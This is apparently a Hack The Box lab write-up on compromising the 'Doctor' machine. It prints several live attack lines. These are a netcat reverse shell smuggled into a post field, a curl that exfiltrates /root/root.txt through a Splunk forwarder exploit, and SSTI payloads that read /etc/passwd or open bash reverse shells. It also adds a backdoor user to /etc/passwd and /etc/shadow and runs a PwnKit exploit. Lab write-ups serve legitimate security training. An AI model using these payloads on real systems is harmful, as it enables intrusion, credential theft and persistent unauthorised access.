## Default Information
IP Address: 10.10.10.209\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our /etc/hosts file.

```
10.10.10.209    doctor.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.209 --rate=1000 -e tun0 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-13 02:29:53 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8089/tcp on 10.10.10.209                                  
Discovered open port 80/tcp on 10.10.10.209                                    
Discovered open port 22/tcp on 10.10.10.209
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| HTTP | Apache httpd 2.4.41 ((Ubuntu)) | Open |
| 8089	| SSL/HTTP | Splunkd httpd | Open |

### Whatweb

From the whatweb output on port 80, we are able to find another host, ```doctors.htb```

```
[ Email ]
	Extract email addresses. Find valid email address and
	syntactically invalid email addresses from mailto: link
	tags. We match syntactically invalid links containing
	mailto: to catch anti-spam email addresses, eg. bob at
	gmail.com. This uses the simplified email regular
	expression from
	http://www.regular-expressions.info/email.html for valid
	email address matching.

	String       : info@doctors.htb
```

We will then add this host to our /etc/hosts file

```
10.10.10.209    doctors.htb doctor.htb
```

### Gobuster
We will first use Gobuster to find the endpoints at http://doctor.htb on port 80. However, I was unable to find any output that catches my attention.

```
http://10.10.10.209:80/.htpasswd.txt        (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess            (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta.aspx            (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta.jsp             (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess.txt        (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta                 (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess.html       (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta.txt             (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess.php        (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta.html            (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess.asp        (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta.php             (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess.aspx       (Status: 403) [Size: 277]
http://10.10.10.209:80/.hta.asp             (Status: 403) [Size: 277]
http://10.10.10.209:80/.htaccess.jsp        (Status: 403) [Size: 277]
http://10.10.10.209:80/.htpasswd.html       (Status: 403) [Size: 277]
http://10.10.10.209:80/.htpasswd.php        (Status: 403) [Size: 277]
http://10.10.10.209:80/.htpasswd.asp        (Status: 403) [Size: 277]
http://10.10.10.209:80/.htpasswd.aspx       (Status: 403) [Size: 277]
http://10.10.10.209:80/.htpasswd.jsp        (Status: 403) [Size: 277]
http://10.10.10.209:80/.htpasswd            (Status: 403) [Size: 277]
http://10.10.10.209:80/about.html           (Status: 200) [Size: 19848]
http://10.10.10.209:80/blog.html            (Status: 200) [Size: 19848]
http://10.10.10.209:80/contact.html         (Status: 200) [Size: 19848]
http://10.10.10.209:80/css                  (Status: 301) [Size: 310] [--> http://10.10.10.209/css/]
http://10.10.10.209:80/departments.html     (Status: 200) [Size: 19848]
http://10.10.10.209:80/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.209/fonts/]
http://10.10.10.209:80/images               (Status: 301) [Size: 313] [--> http://10.10.10.209/images/]
http://10.10.10.209:80/index.html           (Status: 200) [Size: 19848]
http://10.10.10.209:80/index.html           (Status: 200) [Size: 19848]
http://10.10.10.209:80/js                   (Status: 301) [Size: 309] [--> http://10.10.10.209/js/]
http://10.10.10.209:80/server-status        (Status: 403) [Size: 277]
http://10.10.10.209:80/services.html        (Status: 200) [Size: 19848]

```

Next, we will use Gobuster to find the endpoints of https://doctor.htb at port 8089, but there are no interesting findings.

```
https://10.10.10.209:8089/robots.txt           (Status: 200) [Size: 26]
https://10.10.10.209:8089/robots.txt           (Status: 200) [Size: 26]
https://10.10.10.209:8089/services             (Status: 401) [Size: 130]
https://10.10.10.209:8089/v1                   (Status: 200) [Size: 2178]
https://10.10.10.209:8089/v4                   (Status: 200) [Size: 2178]
https://10.10.10.209:8089/v2                   (Status: 200) [Size: 2178]
https://10.10.10.209:8089/v3                   (Status: 200) [Size: 2178]
```

Lastly, we will use Gobuster to find the endpoints of http://doctors.htb. For this site, there are a few interesting endpoints such as /archive and /login, which we will discover in depth later.

```
http://doctors.htb/login                (Status: 200) [Size: 4204]
http://doctors.htb/archive              (Status: 200) [Size: 101]
http://doctors.htb/home                 (Status: 302) [Size: 245] [--> http://doctors.htb/login?next=%2Fhome]
http://doctors.htb/register             (Status: 200) [Size: 4493]
http://doctors.htb/account              (Status: 302) [Size: 251] [--> http://doctors.htb/login?next=%2Faccount]
http://doctors.htb/logout               (Status: 302) [Size: 217] [--> http://doctors.htb/home]
http://doctors.htb/reset_password       (Status: 200) [Size: 3493]
http://doctors.htb/server-status        (Status: 403) [Size: 276]
```

### Web-content discovery

Exploring http://doctors.htb/register, we discover a sign up page to register a user to login to the site. However, we realize that the user will only be valid for 20mins. 

![Sign up page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/signup.png)

On the /home page, we realize that we are able to create a new post, and the creation of this new post will be reflected on our /archive page.

![Creating new post](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/new_post.png)

![Page archive](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/archive.png)

Looking at the response at /archive, I figured out that the website might be vulnerable to an XXE injection, and decided to try an OOB XXE injection using the payload ```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.5:4000/test"> ]>```

![XXE Injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/xxe_injection.png)

Next, we will try to do a code injection by modifying the payload to ```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.5:4000/$(id)"> ]>``` and the output is reflected on our server

![code injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/code_injection.png)
## Exploit
### Obtaining reverse shell

To obtain a reverse shell, we can modify the payload to ```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.5:4000/$(nc.traditional$IFS-c$IFS/bin/bash$IFS'10.10.16.5'$IFS'3000')"> ]>```

After obtaining the reverse shell, we will have to stabilize the shell

```
┌──(kali㉿kali)-[~]
└─$ exec bash --login
┏━(Message from Kali developers)
┃
┃ We have kept /usr/bin/python pointing to Python 2 for backwards
┃ compatibility. Learn how to change this and avoid this message:
┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
┃
┗━(Run: “touch ~/.hushlogin” to hide this message)
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.209] 42614
python3 -c 'import pty; pty.spawn("/bin/bash")'
web@doctor:~$ ^Z
[1]+  Stopped                 nc -nlvp 3000

┌──(kali㉿kali)-[~]
└─$ stty raw -echo

┌──(kali㉿kali)-[~]
nc -nlvp 3000
             export TERM=xterm
web@doctor:~$ stty cols 132 rows 34
web@doctor:~$ 

```

### Privilege Escalation to shaun

From the terminal, we are able to find that there are 2 users on this terminal, namely web and shaun. We are also able to know that the user flag lies in the user, Shaun. However, the current user does not have the privilege to read the user flag.

```
web@doctor:~/blog/flaskblog/users$ cd /home
cd /home
web@doctor:/home$ ls
ls
shaun  web
web@doctor:/home$ ls shaun
ls shaun
user.txt
web@doctor:/home$ cat shaun/user.txt
cat shaun/user.txt
cat: shaun/user.txt: Permission denied
web@doctor:/home$ 
```

From Linpeas, we are able to discover that we can access the log files, and the log files are exposing a possible password.

```
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"  
```

Afterwards, we will su into the Shaun with the password, Guitar123

```
web@doctor:/home$ su shaun
su shaun
Password: Guitar123

shaun@doctor:/home$
```

### Obtaining user flag

```
shaun@doctor:/home$ cat /home/shaun/user.txt
cat /home/shaun/user.txt
<Redacted user flag>
```

### Privilege Escalation to root

With the user shaun, we realized that we are unable to execute sudo commands as shaun is not in the list of sudoers

```
shaun@doctor:~$ sudo -l
[sudo] password for shaun: 
Sorry, user shaun may not run sudo on doctor.
shaun@doctor:~$ 
```

Using Linpeas and LinEnum script, we are als unable to find any useful information :(

However, we realize that we have not accessed http://doctor.htb:8089. Accessing this http://doctor.htb, we are able to know that we are using splunk build 8.0.5, and accessing the /services endpoint, we also realize that we would require the correct credentials to login.

![Splunk login](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/splunk_endpoint.png)

Let's try to login with the credentials shaun:Guitar123 that we have found earlier. Surprisingly, we are able to login with the credentials and we are greeted with 
With some googling, we manage to find this [site](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/), which explains that the port 8089 that we are looking at belongs to Splunk Universal Forwarder Agent which could be exploited. 

### Obtaining root flag

To obtain the root flag, we will open up a reverse shell on port 4444. Using the script from [PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2), we will execute the script on our local terminal.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/SplunkWhisperer2/PySplunkWhisperer2]
└─$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password "Guitar123" --payload "curl -F 'data=@/root/root.txt' http://10.10.16.5:4444" --lhost 10.10.16.5
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmpckxjyyye.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.16.5:8181/
10.10.10.209 - - [13/Nov/2021 23:03:24] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup
```

On our reverse shell at port 4444, we will be able to obtain our root flag.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 4444           
listening on [any] 4444 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.209] 42612
POST / HTTP/1.1
Host: 10.10.16.5:4444
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 219
Content-Type: multipart/form-data; boundary=------------------------a064bc71a3674b71

--------------------------a064bc71a3674b71
Content-Disposition: form-data; name="data"; filename="root.txt"
Content-Type: text/plain

<Redacted flag>

--------------------------a064bc71a3674b71--

```
## Post-Exploitation
### Server Side Template Injection

From the reverse shell output,  we realize that this website is running on Flask framework, and so we can be sure that the templates that is probably being used here in Jinja2.

```
web@doctor:~$ ls
ls
blog  blog.sh
web@doctor:~$ cd blog
cd blog
web@doctor:~/blog$ ls
ls
flaskblog  run.py
```

Knowing that the site is likely to be running on Jinja2, we can know that the site is most likely vulnerable to SSTI. Using the payload ```{{7*7}}```, we can test if the site is vulnerable to SSTI. Even though the exploit is not reflected on the site when the user creates a new message, but this payload is being evaluated at the /archive endpoint

![SSTI web](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/ssti_web.png)

![SSTI Archive](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/ssti_archive.png)

Using SSTI, we will be able to read remote files with the following payloads.

```
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

Using SSTI, we are also able to get a reverse shell using either of the following payloads:

```
{{config.__class__.__init__.__globals__['os'].popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.5\",4000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'").read()}}

{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.5\",4000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'").read()}}{%endif%}{%endfor%}

{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQwMDAgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
```

### Splunk Universal Forwarder Agent Exploit

The Splunk Universal Forwarder Agent allows authenticated remote users to send commands/scripts to agents via the Splunk API. Howeverm the Universal Forwarder agent does not validate whether the connections are coming from a valid Splunk Enterprise server, nor does it validate if the code is signed/coming from the valid Splunk Enterprise server. This would mean that any attacker who has valid credentials to the Splunk Universal Forwarder Agent will be able to upload malicious Splunk bundle that can execute code

Firstly, we will have to create a malicious bundle on our local machine. This can be done by first creating a create a file with the malicious payload, and a configuration file for the payload. Afterwards, we will tar the payload file and the configuration file.

```
## Configuration file
[script://$SPLUNK_HOME/etc/apps/_PWN_APP_/bin/pwn.bat]
disabled = false
index = default
interval = 60.0
sourcetype = test
```

![Creating malicious splunk bundle](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/splunk_bundle_tar.png)

Afterwards, we will host the malicious bundle on our local machine, and send a post request to the /services/app/local endpoint with Splunk's authenticated API. Since there is a lack of validation of where the url is coming from, this will allow us to install the malicious bundle on Splunk and the rce will be exploited

![Exploiting malicious bundle](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/exploitation.png)


Apart from that, we can also make use of this exploit to modifying the /etc/passwd and /etc/shadow files
Firsly, we can use the script to add the user attacker007 to our /etc/passwd file
```
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password "Guitar123" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 10.10.16.5
```

![/etc/passwd file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/etc_passwd.png)

Next, we will use the script to add the user attacker007 to our /etc/shadow fiile

```
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password "Guitar123" --payload "echo 'attacker007:test:18487:0:99999:7:::' >> /etc/shadow" --lhost 10.10.16.5
```

![/etc/shadow](https://github.com/joelczk/writeups/blob/main/HTB/Images/Doctor/etc_shadow.png)

### Alternative way of privilege escalation (root)
Using linpeas, we notice that the server is vulnerable to CVE-2021-4034.

```
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034 
```

Downloading the exploit script to the server and compiling the exploit script, and finally executing the exploit script will then give us root permissions

```
web@doctor:/tmp/.ICE-unix/exploit/CVE-2021-4034$ make
make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
web@doctor:/tmp/.ICE-unix/exploit/CVE-2021-4034$ ./cve-2021-4034
./cve-2021-4034
# id
id
uid=0(root) gid=0(root) groups=0(root),4(adm),1001(web)
# 
```
